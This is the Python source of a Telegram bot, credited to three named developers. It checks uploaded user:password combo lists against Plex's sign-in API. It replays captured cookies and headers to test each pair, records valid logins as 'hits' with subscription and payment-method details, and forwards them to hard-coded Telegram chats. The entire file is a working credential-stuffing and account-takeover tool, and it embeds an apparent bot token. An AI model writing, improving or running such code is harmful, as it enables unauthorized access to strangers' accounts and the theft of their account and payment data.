#—————–———Welcome————————#
# The BoT was made by 3-Developers
# Mostafa » python coder » tg: @E_2_7
# Ahmed » python coder » tg: @IGFIG
# Mostafa » php coder & api maker » tg: @P_Q_Z

# The Code is For Personal Use Only And is Not Permitted To Be Sold in Any Way
# Don't Forget to join ch: @Telemex
# Bye ;)
#——————–——Creadits———–—————#
import requests,time, telebot
from termcolor import colored
#———————–—Libraries————––———#
session = requests.Session()
#——————–——session—————————#
bot = telebot.TeleBot('6047075637:AAGq1Np0y4FT8iuVLCpM-F-vLuBkARmK-Fo')
#——–——–—–—BoT_Login———–————#
@bot.message_handler(commands=['start'])
def start(message):
	chat_id = message.chat.id
	bot.send_message(message.chat.id, "Welcome! Send me the file.")
#——————————————————————#
	@bot.message_handler(content_types=['document'])
	def handle_document(message):
		file_info = bot.get_file(message.document.file_id)
		downloaded_file = bot.download_file(file_info.file_path)
		file_content = downloaded_file.decode('utf-8')
		lines = file_content.strip().split('\n')
#——————————————————————#
		msg = bot.send_message(chat_id=chat_id,text="The Checking Started, Wait...⌛")
#——————————————————————#
		work = 0
		cents = 0
		fucked = 0
#——————————Lists—————————#
		for line in lines:
			line = line.strip()
			try:
				user, pas = line.split(':')
				email = f"{user}:{pas}"
				email1 = f"{user} • {pas}"	#——————————————————————#
				cookies = {
	'_gcl_au': '1.1.755540513.1700853011',
	'_rdt_uuid': '1700853011401.b7192c04-678d-41a4-81d5-b2adf5e4f446',
	'_gid': 'GA1.2.1229419667.1700853012',
	'_fbp': 'fb.1.1700853012500.1589064344',
	'afUserId': '17360a7f-f378-463c-87ac-314c7bafaca7-p',
	'AF_SYNC': '1700853013216',
	'plex_tv_optin_analytics': '1',
	'plex_tv_optin_thirdparty': '1',
	'plex_tv_cookie_consent': '2',
	'_gat_UA-6111912-29': '1',
	'_ga_WVSCQW4NQZ': 'GS1.1.1700853010.1.1.1700854256.0.0.0',
	'_ga_G6FQWNSENB': 'GS1.1.1700853010.1.1.1700854256.57.0.0',
	'_ga': 'GA1.2.1994553350.1700853011',
	'_my-plex_session_32': 'NnRsMXJmcnVMem1ydHVpVlNyMWN4cjVGUGFXQjByWE9FMGxBVzBPL1RmczdkeVpLR0YzMC93VWRGdXFERExIQmlyZUd3U0VkQjRHbzNwWTBlQ01zSkE9PS0tNDUxUjQxNnZ0dVptODZ0bzRwRzYrUT09--cc0fe11d30563d5514ae42cf97e5021c047ce058',
}
				headers = {
	'authority': 'clients.plex.tv',
	'accept': 'application/json',
	'accept-language': 'en-US,en;q=0.9',
	'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'origin': 'https://app.plex.tv',
	'referer': 'https://app.plex.tv/',
	'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua-platform': '"Linux"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-site',
	'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
}
				params = {
	'X-Plex-Product': 'Plex SSO',
	'X-Plex-Client-Identifier': 'eccd8fa4-6c16-a077-c347-ba5fe820bd43',
}
				data = {
			'login': email,
			'password': pas,
			'rememberMe': 'true',}
				response = session.post('https://clients.plex.tv/api/v2/users/signin', params=params, cookies=cookies, headers=headers, data=data)
#—————————Request———————––#
				try:
					response_data = response.json()
					subscription = response_data.get('subscription', {})
					plan = subscription.get('plan')
					plan = 'free' if plan == 'none' else plan	#——————————————————————#
					if response_data.get('hasPassword') == True and plan != 'none':
						hit_message = f'▪︎Hit: {email}:{pas}\nAccount-info:\nSubscription Active: {subscription.get("active")}\nSubscription Status: {subscription.get("status")}\nPlan: {plan}\nPayment Method: {subscription.get("paymentService")}'
						print(colored(hit_message, 'green'))
						bot.send_message(chat_id='-1001853308237', text=hit_message, parse_mode='Markdown')
					elif plan == 'none':
						hit_message = f'▪︎Hit: {email}:{pas}\nPlan: {plan}'
						print(hit_message)
						bot.send_message(chat_id='-1001760151497', text=hit_message)
					else:
						print(colored(f'Dead: {email}:{pas}', 'red'))	#——————————————————————#
				except ValueError:
					fucked += 1
				time.sleep(5)	#——————————————————————#
				reply_markup = create_reply_markup(email1,work,cents,fucked,len(lines))
				bot.edit_message_text(
	chat_id=chat_id,
	message_id=msg.message_id,
	text="Checking in progress...\nBot By @E_2_7 & @IGFIG & @P_Q_Z",
	reply_markup=reply_markup)
#——————————————————————#
			except ValueError:print("fuck")
#——————————————————————#
def create_reply_markup(line, work, cents, fucked, All):
    markup = telebot.telebot.types.InlineKeyboardMarkup()
    email_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {line} • ⌝", callback_data='none')
    work_button = telebot.types.InlineKeyboardButton(text=f"⌯ H-Balance: {work}", callback_data='none')
    cents_button = telebot.types.InlineKeyboardButton(text=f"Cents: {cents} ⌯", callback_data='none')
    dead_button = telebot.types.InlineKeyboardButton(text=f"⌞ • Fucked: {fucked}", callback_data='none')
    all_button = telebot.types.InlineKeyboardButton(text=f"All: {All} • ⌟", callback_data='none')
    
    team_button = telebot.types.InlineKeyboardButton(text="Dev Team", url='https://t.me/telemex')
    dev_button = telebot.types.InlineKeyboardButton(text="Dev", url='https://t.me/E_2_7')
    
    markup.row(email_button)
    markup.row(work_button, cents_button)
    markup.row(dead_button, all_button)
    markup.add(team_button,dev_button)
    return markup
#—————————markup—————————#
bot.infinity_polling()
